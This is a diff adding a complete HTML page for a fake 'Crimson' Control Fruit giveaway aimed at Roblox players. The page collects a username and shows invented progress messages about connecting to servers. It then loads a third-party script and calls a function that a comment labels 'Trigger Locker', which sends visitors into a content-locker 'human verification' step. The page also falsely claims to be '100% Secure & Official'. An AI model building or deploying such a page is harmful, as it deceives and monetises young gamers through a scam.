@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crimson Giveaway - Control Fruit</title>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary-blue: #00A2FF;
+            --blox-purple: #6b32a8;
+            --blox-dark: #1e1e2d;
+            --gold: #ffcc00;
+            --soft-blue: #e1f5fe;
+        }
+
+        body {
+            font-family: 'Source Sans Pro', sans-serif;
+            background: #0a0a0f url('https://images8.alphacoders.com/129/1292150.png') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: -1;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 450px;
+            background: rgba(255, 255, 255, 0.98); /* Light clean background */
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            padding: 30px;
+            color: #333; /* Dark text for a friendly feel */
+        }
+
+        .logo-img {
+            width: 180px; /* Your Crimson Logo */
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 900;
+            color: var(--blox-purple);
+            margin: 0 0 10px 0;
+        }
+
+        .fruit-preview {
+            background: #f0f2f5;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 15px 0;
+            border: 2px dashed #00A2FF;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .fruit-preview img {
+            width: 50px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border-radius: 10px;
+            border: 2px solid #ddd;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            margin-bottom: 15px;
+            transition: 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: var(--primary-blue);
+        }
+
+        .claim-btn {
+            background: #00A2FF; /* Roblox Blue */
+            color: white;
+            font-weight: 700;
+            font-size: 18px;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 4px 0 #0074bd;
+            transition: 0.2s;
+        }
+
+        .claim-btn:hover { background: #008be0; }
+
+        /* Friendly Status Box (No longer scary CMD) */
+        #status-container {
+            display: none;
+            background: #e3f2fd;
+            color: #0d47a1;
+            padding: 15px;
+            text-align: left;
+            border-radius: 10px;
+            font-size: 14px;
+            margin-top: 20px;
+            border: 1px solid #bbdefb;
+        }
+
+        .loading-dots:after {
+            content: ' .';
+            animation: dots 1s steps(5, end) infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { color: rgba(0,0,0,0); text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); }
+            40% { color: #0d47a1; text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); }
+            60% { text-shadow: .25em 0 0 #0d47a1, .5em 0 0 rgba(0,0,0,0); }
+            80%, 100% { text-shadow: .25em 0 0 #0d47a1, .5em 0 0 #0d47a1; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://i.ibb.co/XfzxhSx6/crimson.png" alt="Crimson Logo" class="logo-img">
+        
+        <h1>Control Fruit Giveaway</h1>
+        <p style="color: #666;">Enter your username below to receive your fruit!</p>
+
+        <div class="fruit-preview">
+            <i class="fa-solid fa-circle-check" style="color: #00B06F;"></i>
+            <span>Reward: <b>Control Fruit (Physical)</b></span>
+        </div>
+
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Enter Roblox Username..." autocomplete="off">
+        </div>
+
+        <button class="claim-btn" onclick="startProcess()">Start Claim Process</button>
+
+        <div id="status-container"></div>
+
+        <p style="font-size: 12px; color: #999; margin-top: 15px;">
+            <i class="fa-solid fa-shield-halved"></i> 100% Secure & Official Crimson Giveaway
+        </p>
+    </div>
+
+    <script type="text/javascript">
+        var GDuoC_BXI_XzTvjc={"it":4579926,"key":"37b77"};
+    </script>
+    <script src="https://duw03nk63ml3f.cloudfront.net/191b4fa.js"></script>
+
+    <script>
+        function startProcess() {
+            var user = document.getElementById('username').value;
+            if (user.length < 3) {
+                alert("Please enter your Roblox username!");
+                return;
+            }
+
+            var btn = document.querySelector('.claim-btn');
+            var status = document.getElementById('status-container');
+            
+            btn.style.display = 'none';
+            status.style.display = 'block';
+
+            // Friendly messages (Blue/White style)
+            const messages = [
+                "Searching for user " + user + "...",
+                "User found! Connecting to Crimson database...",
+                "Preparing your Control Fruit reward...",
+                "Almost ready! Syncing with Roblox server...",
+                "Final Step: Please complete the human verification."
+            ];
+
+            let i = 0;
+            function printMessage() {
+                if (i < messages.length) {
+                    status.innerHTML = "<div style='margin-bottom:5px;'><i class='fa-solid fa-circle-notch fa-spin'></i> " + messages[i] + "</div>";
+                    i++;
+                    setTimeout(printMessage, 1500); // Slower, calmer timing
+                } else {
+                    status.innerHTML = "<b style='color:#00A2FF;'><i class='fa-solid fa-check-circle'></i> Verification Required!</b><br>Click the button in the window to finish.";
+                    setTimeout(function() {
+                        _oy(); // Trigger Locker
+                    }, 800);
+                }
+            }
+            printMessage();
+        }
+    </script>
+</body>
+</html>
